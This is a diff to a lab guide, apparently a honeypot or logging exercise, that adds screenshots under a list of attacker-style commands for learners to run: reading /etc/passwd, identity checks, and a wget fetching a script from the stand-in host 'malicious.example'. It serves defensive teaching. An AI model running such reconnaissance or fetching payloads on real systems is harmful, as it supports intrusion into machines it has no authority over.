@@ -101,15 +101,23 @@ Try running suspicious commands an attacker would use:
 ```bash
 uname -a
 ```
+![image](/FilesForLabs/images/beezlebub_uname.png)
+
 ```bash
 cat /etc/passwd
 ```
+![image](/FilesForLabs/images/beezlebub_catpass.png)
+
 ```bash
 wget http://malicious.example/malware.sh
 ```
+![image](/FilesForLabs/images/beezlebub_wgetmal.png)
+
 ```bash
 id
 ```
+![image](/FilesForLabs/images/beezlebub_id.png)
+
 Now exit the session by typing **exit** and hitting **enter** to export the logs
 
 <hr>
